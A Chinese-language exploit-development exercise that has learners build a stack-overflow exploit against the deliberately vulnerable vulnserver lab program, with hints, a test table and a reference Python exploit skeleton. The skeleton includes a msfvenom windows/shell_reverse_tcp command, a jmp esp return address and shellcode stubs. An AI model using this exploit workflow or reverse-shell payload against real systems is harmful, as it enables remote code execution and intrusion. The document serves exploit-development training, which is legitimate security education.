# 練習 A — vulnserver 完整 stack overflow exploit

> **目標**：不照抄 TRUN 的既定答案,獨立對 vulnserver 的另一個指令(建議 `GTER` 或 `KSTET`,從 `HELP` 列表挑一個你還沒碰過的)跑完整個 fuzz → 控 EIP → 壞字元 → jump point → shellcode 的生產線,寫出一支完整可用的反彈 shell exploit。

> **環境**：Win10 x64 22H2 + WinDbg（2026）+ mona v3 + Python 3 + Kali。假設你已完成 Ch 7-10。

## 背景與動機

Ch 7-10 全程用 TRUN 當範例,这個指令的 offset(2003)、漏洞類型都是網路上廣為人知的答案——你完全有可能照著抄一遍腳本卻沒真正理解方法論。OSED 考試不會告訴你哪個指令有洞、offset 是多少,你必須自己從 `HELP` 列出的指令清單裡,挑一個、測它、如果沒洞換下一個,直到你找到並打穿為止。

這個練習的重點不是「再寫一次 exploit」,而是**驗證你是不是真的學會了方法論,而不是記住了一組數字**。vulnserver 的其他指令(`GTER`、`KSTET`、`GMON` 等)有些有類似 TRUN 的 vanilla stack overflow,有些可能是別的漏洞類型甚至沒有洞——你需要自己判斷。

## 任務規格

1. 連上 vulnserver,打 `HELP`,列出所有指令,挑一個**不是 TRUN** 的指令作為目標(建議 `GTER` 或 `KSTET`,這兩個在公開資料中有被記錄為 vanilla stack overflow,但本練習要求你自己動手確認,不要依賴這句話當答案)。
2. 對該指令完整跑一次 Ch 7-10 的五步法:
   - fuzzing 確認有無溢位、能否讓服務崩潰
   - 用 cyclic pattern 找出精確 offset
   - 驗證 offset(`BBBB` 測試)
   - 找壞字元
   - 用 mona 找 `jmp esp` 跳板位址(需符合模組選擇準則:不含壞字元、無 ASLR、優先選程式自帶模組)
   - 組裝完整 payload(填充 + 跳板 + NOP sled + shellcode)
3. 用 msfvenom 產生排除壞字元的 reverse shell shellcode,整合進 exploit。
4. 在你自己的 VM 裡驗證:攻擊機 `nc` 監聽,跑 exploit,確認拿到 shell。

## 期望輸出

- 一支完整的 Python 3 exploit 腳本(命名建議 `exploit_<指令名>.py`),結構對齊 Ch 10 的四段式 payload。
- 你自己的一組實測記錄(就算在這份文件裡你只能寫「理論預期」,也要清楚標注你會怎麼在自己環境驗證):該指令的精確 offset、壞字元清單、選用的跳板位址與來源模組。
- 簡短說明為什麼選這個模組的跳板位址(對照 Ch 9 的模組選擇準則逐條檢查)。

## 如果卡住:提示

1. **`HELP` 列出的指令試了幾個都沒崩潰**：不是所有指令都有洞。先讀 vulnserver 的原始碼(GitHub 上公開),看每個指令的處理函式有沒有明顯的不安全複製(`strcpy`、`sprintf` 無長度檢查這類模式),縮小目標範圍比盲測更有效率。
2. **崩潰了但 EIP 沒有被覆寫成你送的資料**：可能這個指令的漏洞類型不是蓋 `saved EIP`,而是別的(例如 SEH 相關,Part 3 才會教)。先用 WinDbg 看崩潰時完整的暫存器與呼叫堆疊(call stack),判斷到底是什麼類型的記憶體錯誤。
3. **cyclic pattern 送出去,EIP 裡的值不在 pattern 的合法範圍內**：可能 pattern 長度不夠長(溢位範圍比你產生的 pattern 還大),或者這個指令的 buffer 結構比 TRUN 複雜(例如中間有別的欄位會先造成別的崩潰)。試著加長 pattern,或先用全 `A` 確認大概的崩潰長度再決定 pattern 大小。
4. **找到的 jmp esp 位址送出去還是沒跳過去**：檢查位址是否真的不含壞字元(自己肉眼算一次 4 bytes),檢查 `struct.pack` 的格式字串是否正確(`<I` 而非 `>I`),檢查該位址所在模組是否真的被目標行程載入(可能你選的模組根本沒被該指令的程式路徑用到)。
5. **shellcode 送過去完全沒反應,EIP/ESP 看起來都對**：用一個簡單的 `calc.exe` 執行 shellcode(`windows/exec CMD=calc.exe`)先驗證「能不能執行任意 shellcode」,排除掉「reverse shell 連線設定錯誤(IP/port/防火牆)」這個變因,再回頭查完整 reverse shell payload。

## 實作步驟

1. **偵查**:`nc` 連上 vulnserver,打 `HELP`,挑目標指令,讀原始碼(如果想先降低盲測成本)。
2. **Fuzzing + 首次崩潰**:寫一支簡單的遞增或直接大 payload 的腳本,確認該指令會讓服務崩潰且 `EIP` 被你的資料覆寫。
3. **精確定位 + 壞字元**:cyclic pattern 算 offset,`BBBB` 驗證,mona bytearray + compare 找壞字元,跑到乾淨為止。
4. **跳板 + 組裝**:mona 找 `jmp esp`,依模組選擇準則挑一個,組裝完整 payload 骨架(先用 NOP + `\xcc`(int3 中斷指令)代替真正 shellcode,在 WinDbg 裡確認真的能跳到 NOP sled 執行)。
5. **真正的 shellcode + 驗證**:換上 msfvenom 產生的 reverse shell shellcode,`nc` 監聽,跑 exploit,確認拿到 shell。

## 參考解答

<details>
<summary>完整參考解答（先自己動手，卡住 15 分鐘以上才展開）</summary>

以下以 `GTER` 為範例(**未實測,理論預期**——`GTER` 是否真的存在 vanilla stack overflow、其精確 offset 與壞字元清單,請在你自己的環境依本章方法實測確認,下面的數值僅為示範骨架,不可直接當答案抄用):

```python
#!/usr/bin/env python3
"""
vulnserver GTER stack overflow -> reverse shell（範例骨架，未實測)
所有數值（offset / 跳板位址 / 壞字元）皆須由你自己在 VM 裡依 Ch7-10 方法實測後填入。
"""
import socket
import struct
import sys

target_ip   = "192.168.x.x"
target_port = 9999

# ---- Step 1: fuzzing / 首次崩潰確認（示範用大 payload） ----
def fuzz_once():
    buf = b"A" * 3000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.recv(1024)
    s.send(b"GTER " + buf + b"\r\n")
    s.close()

# ---- Step 2-3: 填入你自己實測出的 offset 與跳板位址 ----
offset = 9999          # 占位值，務必換成你自己 pattern_offset 的實測結果
jmp_esp_addr = 0xDEADBEEF   # 占位值，務必換成你自己 mona jmp -r esp 的實測結果
jmp_esp = struct.pack("<I", jmp_esp_addr)

nop_sled = b"\x90" * 16

# ---- Step 4: msfvenom 產生的 shellcode（排除你自己實測出的壞字元）----
# msfvenom -p windows/shell_reverse_tcp LHOST=<攻擊機IP> LPORT=4444 \
#   -b "\x00\x0a\x0d" -f python -v shellcode
shellcode  = b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00..."  # 由你自己的 msfvenom 輸出貼上

def build_payload():
    buf  = b"A" * offset
    buf += jmp_esp
    buf += nop_sled
    buf += shellcode
    return b"GTER " + buf + b"\r\n"

def send_exploit():
    payload = build_payload()
    print(f"[*] payload 長度：{len(payload)} bytes")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target_ip, target_port))
    s.recv(1024)
    s.send(payload)
    print("[+] payload 已送出")
    s.close()

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "exploit"
    if mode == "fuzz":
        fuzz_once()
    else:
        send_exploit()
```

> 參考解答的結構和 Ch 10 的腳本一致,差異只在目標指令換成 `GTER` 以及所有數值都要換成你自己測出來的結果。這正是練習的用意:**框架相同,數值自己打**。

</details>

## 測試用例表

| 測試情境 | 預期行為 | 如何驗證 |
|---|---|---|
| 送小量資料給目標指令 | 服務正常回應,無異常 | nc 手動連線測試 |
| 送超大量 `A` | WinDbg 中斷,`EIP` 被 `0x41414141` 覆寫 | WinDbg attach + access violation 中斷 |
| 送 cyclic pattern 後用 `pattern_offset` 查詢 | 回報一個合理的 offset 數字(不是 0 或超出 pattern 長度) | mona `pattern_offset` 指令 |
| 用算出的 offset 送 `BBBB` | `EIP` 精確等於 `0x42424242` | WinDbg 暫存器視窗 |
| 送完整 bytearray 後用 `compare` | 第一輪一定找到至少一個壞字元(`\x00` 幾乎必然在內) | mona `compare` 指令 |
| 送最終完整 payload(含真正 shellcode) | 攻擊機 `nc -lvnp 4444` 收到連線 | 攻擊機監聽 + exploit 執行後觀察 |

## 延伸挑戰

1. **換成不含壞字元的手工 shellcode**：把 msfvenom 產生的 shellcode 換成你自己手寫、不依賴 encoder 排除壞字元的版本(需要先完成 Part 6 的 PEB walk 與 API resolution)。這會讓你在不依賴 msfvenom 的情況下也能打穿目標——銜接 [Part 6 自寫 x86 Shellcode](./22-why-write-shellcode.md)。
2. **對同一個指令同時找出兩種不同的跳板位址(來自不同模組)**,比較兩者的穩定性(例如換一台重開機後的靶機測試是否都還有效)。
3. **嘗試用 `call esp`(`FF D4`)取代 `jmp esp`(`FF E4`)作為跳板**,觀察 shellcode 前是否需要額外墊幾個 byte 來吸收 `call` 多 push 的返回位址。

## 自我檢核

- [ ] 能說出你挑選的指令(`GTER`/`KSTET`/其他)和 TRUN 在漏洞成因上是否相同
- [ ] 能複述你自己實測出的 offset、壞字元清單、跳板位址,並說明每個是怎麼測出來的
- [ ] 能解釋為什麼選擇的跳板位址符合 Ch 9 的模組選擇準則
- [ ] 能在完全不看 Ch 10 腳本的情況下,獨立重寫一支結構相同但數值不同的 exploit
- [ ] 能說出如果 exploit 不穩定(偶爾成功偶爾失敗),你會先檢查哪個環節

掌握 vanilla stack overflow 全套流程之後,下一個題型是 SEH overwrite——當目標程式的 buffer 結構讓你碰不到 `saved EIP`,但碰到了 Structured Exception Handler 鏈時,整套技法要怎麼變形。

→ [Ch 11 SEH overwrite 原理](./11-seh-overwrite-principle.md)
